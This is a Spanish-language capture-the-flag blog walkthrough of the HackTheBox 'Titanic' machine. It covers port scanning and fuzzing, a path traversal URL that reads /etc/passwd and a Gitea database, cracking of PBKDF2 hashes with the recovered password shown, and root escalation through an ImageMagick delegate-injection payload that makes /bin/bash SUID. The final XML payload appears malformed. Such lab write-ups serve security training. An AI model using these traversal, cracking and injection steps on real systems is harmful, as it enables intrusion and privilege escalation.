---
layout: post
title:  "Writeup Titanic"
date:   2025-06-21
categories: [Writeup, HackTheBox]
image: /images/writeup-titanic/Pasted image 20250430233146.png
---


***Dificultad: Facil***

***Sistema Operativo: Linux***

---------------------------------------------------------
\
Hola amigos! aquí un nuevo writeup de una maquina #linux 

explotaremos un path traversal que se da gracias a apuntar a un archivo sin validar o tener en cuenta que puede ser manipulado.
Para la escalada de privilegios nos aprovechamos de un script no sanitizado y de una versión de imagemagick vulnerable a inyección de comandos

## Reconocimiento

lo primero es crear los directorios de trabajo en la carpeta (yo tengo un directorio htb) así que:

```bash
mkdir titanic & cd titanic
mkdir nmap content exploits & cd nmap
```

lo primero es escanear todos los puertos de la ip de la maquina, le diremos a nmap que escanee todos los puertos pero solo nos reporte los que estén abiertos, así que que :
```bash
nmap -p- --open -n -sS -Pn -vv --min-rate 5000 10.10.10.10 -oN puertos
```

nos da como resultado:
```javascript
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 23:45 CEST
Initiating SYN Stealth Scan at 23:45
Scanning 10.129.4.241 [65535 ports]
Discovered open port 80/tcp on 10.129.4.241
Discovered open port 22/tcp on 10.129.4.241
Completed SYN Stealth Scan at 23:45, 15.27s elapsed (65535 total ports)
Nmap scan report for 10.129.4.241
Host is up, received user-set (0.057s latency).
Scanned at 2025-04-30 23:45:28 CEST for 15s
Not shown: 55533 closed tcp ports (reset), 10000 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.34 seconds
           Raw packets sent: 77808 (3.424MB) | Rcvd: 56014 (2.241MB)
```
un poco típico en la maquina fáciles, un puerto 22 para ssh y 80 http(una aplicación web)

ahora, vamos a escanear esos puertos con los scripts básicos de reconocimiento de nmap:
```javascript
nmap -p22,80 -sCV -n -vvv 10.10.10.10 -oN objetivos
```

y tenemos como resultado:
```javascript
Completed NSE at 23:49, 0.00s elapsed
Nmap scan report for 10.129.4.241
Host is up, received echo-reply ttl 63 (0.038s latency).
Scanned at 2025-04-30 23:49:18 CEST for 8s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg=
|   256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.

```
tenemos un apache, y un host (titanic.htb)

agregamos en nombre de dominio junto a la ip a nuestro /etc/hosts:
```bash
echo "10.10.10.10    titanic.htb" | tee -a /etc/hosts
```


## Enumeración:

ahora que tenemos un nombre de dominio, antes de pasar al navegador, me gustaría hacerle fuzzing y ver que mas descubrimos desde la terminal

primero, descubrimiento de subdominios con ffuf:
```bash
ffuf  -c --fl=156  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  -u http://titanic.htb -H "Host: FUZZ.titanic.htb" -r
```

he decidido filtrar por el numero de líneas, ya que todos arrojan código de estado 200 con la redirección, por lo que quiero ver solo aquellos que me den un resultado diferente:
<img src="/images/writeup-titanic/Pasted image 20250501000428.png" alt="image">
tenemos un subdominio disponible dev.titanic.htb

ahora, quiero hacerle fuzzing para descubrir directorios al dominio principal:
```bash
ffuf  -c --fc=404  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://titanic.htb/FUZZ

##o puedes usar tambien feroxbuster:

feroxbuster -u http://titanic.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -n
```

yo he usado feroxbuster porque esta herramienta hace fuzzing sobre los directorio s encontrados a la vez de que va probando otros:
```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://titanic.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
400      GET        1l        4w       41c http://titanic.htb/download
405      GET        5l       20w      153c http://titanic.htb/book
200      GET       30l       77w      567c http://titanic.htb/static/styles.css
200      GET      664l     5682w   412611c http://titanic.htb/static/assets/images/home.jpg
200      GET      851l     5313w   507854c http://titanic.htb/static/assets/images/exquisite-dining.jpg
200      GET      859l     5115w   510909c http://titanic.htb/static/assets/images/luxury-cabins.jpg
200      GET     2986l     7000w   469100c http://titanic.htb/static/assets/images/favicon.ico
200      GET      890l     5324w   534018c http://titanic.htb/static/assets/images/entertainment.jpg
200      GET      156l      415w     7399c http://titanic.htb/

```

por los directorios podemos ver solo 2 directorios, ahora si vamos a la pagina web para enumerarla:

<img src="/images/writeup-titanic/Pasted image 20250501073317.png" alt="image">

book tiene un formulario para escoger un viaje en barco y con el botón "submit" vemos que descarga un archivo json, este botón no me muestra un direccionamiento (así que quiero ver esto en burpsuite):

<img src="/images/writeup-titanic/Pasted image 20250501073542.png" alt="image">

pero antes, quiero mirar el archivo descargado con *exiftool*, para saber si hay datos filtrados:
```bash
exiftool 0863951c-3e94-4d93-8a34-b8bdd3fbb890.json

##tenemos como respuesta:

ExifTool Version Number         : 13.10
File Name                       : 0863951c-3e94-4d93-8a34-b8bdd3fbb890.json
Directory                       : .
File Size                       : 113 bytes
File Modification Date/Time     : 2025:05:01 07:34:41+02:00
File Access Date/Time           : 2025:05:01 07:34:41+02:00
File Inode Change Date/Time     : 2025:05:01 07:34:41+02:00
File Permissions                : -rw-rw-r--
File Type                       : JSON
File Type Extension             : json
MIME Type                       : application/json
Name                            : 3vilsec
Email                           : 3vilsec@htb.com
Phone                           : 342342342342
Date                            : 2025-05-09
Cabin                           : Deluxe
```
nada fuera de lo común


ahora, pasando a burpsuite vemos la redirección para la descarga:

<img src="/images/writeup-titanic/Pasted image 20250501075052.png" alt="image">

si seguimos la redirección:
<img src="/images/writeup-titanic/Pasted image 20250501075245.png" alt="image">

tenemos una url bastante curiosa en la cual podemos probar algunas cosas

con un simple path traversal tenemos:
<img src="/images/writeup-titanic/Pasted image 20250501075431.png" alt="image">

la url vulnerable:
```html
http://titanic.htb/download?ticket=../../../../../etc/passwd
```
siempre que hay una url que hace referencia a un archivo del servidor, podemos probar esto

he podido acceder a la flag del usuario:
```
http://titanic.htb/download?ticket=../../../../../home/developer/user.txt
```

pero no he podido acceder a la id_rsa, entonces, esto puede ser una vulnerabilidad que nos sirva para encontrar algo mas.

voy a agregar el subdominio a mi /etc/hosts e intentar enumerar que pista o información podemos aprovechar de allí

es un repositorio gitea:
<img src="/images/writeup-titanic/Pasted image 20250501081154.png" alt="image">
google nos dice: *Gitea es un paquete de software de código abierto para alojar el control de versiones de desarrollo de software utilizando Git*

voy a enumerar un poco la pagina:

el repositorio docker-config, tiene el compose.yml de la pagina gitea, aunque tambien tiene credenciales de la base de datos:
<img src="/images/writeup-titanic/Pasted image 20250501081549.png" alt="image">

*tambien con esto, sabemos que hay una base de datos disponible, a la cual tenemos un método de acceder*

en el otro repositorio, podemos ver la aplicacion y el fragmento de codigo que la hace vulnerable al path traversal:
```python
@app.route('/download', methods=['GET'])
def download_ticket():
 ticket = request.args.get('ticket')
 if not ticket:
  return jsonify({"error": "Ticket parameter is required"}), 400`
 json_filepath = os.path.join(TICKETS_DIR, ticket)`
 if os.path.exists(json_filepath):
  return send_file(json_filepath, as_attachment=True, download_name=ticket)`
else:
 return jsonify({"error": "Ticket not found"}), 404
```


navegando un poco mas, veo que hay otro usuario:

<img src="/images/writeup-titanic/Pasted image 20250501082641.png" alt="image">

aunque esto no sirve de mucho

usando la vulnerabilidad path traversal, busco el docker compose, para ver si tiene algo diferente al del gitea:
<img src="/images/writeup-titanic/Pasted image 20250501092017.png" alt="image">
pero no, aunque nos da info interesante, docker usa volúmenes por lo cual, aquí en el compose nos esta diciendo la ruta donde se ubica

si vamos a:
```
/../../../../../home/developer/gitea/data/gitea/gitea.db
```

<img src="/images/writeup-titanic/Pasted image 20250501092351.png" alt="image">

tenemos la base de datos del gitea y podemos descargarla a nuestra maquina con un wget:
```bash
wget 'http://titanic.htb/download?ticket=/../../../../../home/developer/gitea/data/gitea/gitea.db'
```

abrir la base de datos en la terminal, vamos a usar:
```bnash
mysqlite3 gitea.db
```
y dentro de la base de datos para ver los hashes de usuario:
```
##activar cabeceras
.headers on
select * from user;
select name, passwd, passwd_hash_algo,salt from user;
```

tendremos:
```bash
administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|2d149e5fbd1b20cf31db3e3c6a28fc9b
developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|8bf3e3452b78544f8bee9400d6936d34
```
## Shell como developer:

este patrón de hash y que esta relacionado a gitea me recuerda a una maquina en la que había que crakear un hash almacenado de manear incorrecta, (exactamente la maquina compiled), al volver allí vi que es el mismo patrón en cual se hace tambien referencia en un post de hashcat:
https://hashcat.net/forum/thread-8391-post-44775.html#pid44775

así que debemos reconstruir el hash:

```bash
echo '8bf3e3452b78544f8bee9400d6936d34' | xxd -r -p | base64
echo 'e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56' | xxd -r -p | base64
```
estos comandos, van a llevar los hashes a su base binaria, para a partir de alli convertirlo a base64 que es el formato que nos pide hashcat

y finalmente lo armamos:
```
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

usando hashcat:
```bash
hashcat  hash /usr/share/wordlists/rockyou.txt -m 10900
```

aunque probé ambos hashes, el de developer me ha dado resultado:
```bash
hashcat (v6.2.6) starting
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344390
* Bytes.....: 139921519
* Keyspace..: 14344390

sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqc...lM+1Y=
Time.Started.....: Thu May  1 11:24:57 2025 (15 secs)
Time.Estimated...: Thu May  1 11:25:12 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      381 H/s (5.08ms) @ Accel:16 Loops:1024 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5712/14344390 (0.04%)
Rejected.........: 0/5712 (0.00%)
Restore.Point....: 5600/14344390 (0.04%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:49152-49999
Candidate.Engine.: Device Generator
Candidates.#1....: inferno -> aggies
Hardware.Mon.#1..: Util: 68%

Started: Thu May  1 11:24:56 2025
Stopped: Thu May  1 11:25:13 2025

```
***25282528***

si intentamos conectarnos por ssh:
```bash
ssh developer@10.10.10.10
```
<img src="/images/writeup-titanic/Pasted image 20250501113638.png" alt="image">

enumerando un poco la maquina, vemos que toda la aplicación y scripts de la misma están en el directorio /opt

el mas interesante es un en /opt/scripts llamado identify_images.sh que lo corre el usuario root:
```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

vemos que el script esta abiriendo el directorio /opt/app/static/assets/images, vaciando el archivo metadata.log y busca allí mismo los archivos que terminen en .jpg (sin validar) y lo convierte en salida con imagemagick y el resultado es enviado a meetadata.log

## Shell como Root: 

buscando inyección de comandos a imagemagick podemos encontrar la vulnerabilidad CVE-2024-41817

https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

nos dice que ciertas versiones de magick son vulnerables a inyección de comandos, si verificamos la que esta en la maquina:
```bash
magick --version
```
```bash
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)

```
vemos que si es vulnerable

verificamos si donde el script busca la imagen es un directorio en el cual podemos escribir:
```bash
ls -la /opt/app/static/assets/images/
```
```bash
drwxrwx--- 2 root      developer   4096 Feb  3 17:13  .
drwxr-x--- 3 root      developer   4096 Feb  7 10:37  ..
```

lo primero es crear el archivo que vemos en el POC:
```bash
cat << EOF > ./delegates.xml
<delegatemap><delegate xmlns="" decode="XML" command="id"/></delegatemap>
EOF
```

luego vamos a crear una imagen con un nombre malicioso dado que no hay validación:
```bash
touch 'delegates.xml 3vil.jpg'
```

por alguna razon el script no funciona si el metadata.log existe asi que el comando que ejecuto en el directorio /opt/scripts es:
```bash
rm /opt/app/static/assets/images/metadata.log && ./identify_images.sh
```

al abrir el .log:
<img src="/images/writeup-titanic/Pasted image 20250501193957.png" alt="image">
se están ejecutando comandos de root gracias al archivo xml

así que, para ejecutar un comando mas completo use:
```xml
cat << EOF > ./delegates.xml
<delegatemap><delegate xmlns="" decode="XML" command=<name>chmod</name>
    <permissions>u+s</permissions>
    <target>/bin/bash</target></delegatemap>
EOF
```
para así convertir la bash en suid

luego ejecute
```bash
rm /opt/app/static/assets/images/metadata.log && ./identify_images.sh
```

y finalmente:

<img src="/images/writeup-titanic/Pasted image 20250501201748.png" alt="image">

con esto, podemos volvernos root con el comando ***/bin/bash -p***

------------------------
\
nos vemos en la siguiente maquina! 

## H4ck th3 W0rld

<img src="/images/devil.jpg" style="border-radius:200px; width:100px;" alt="image">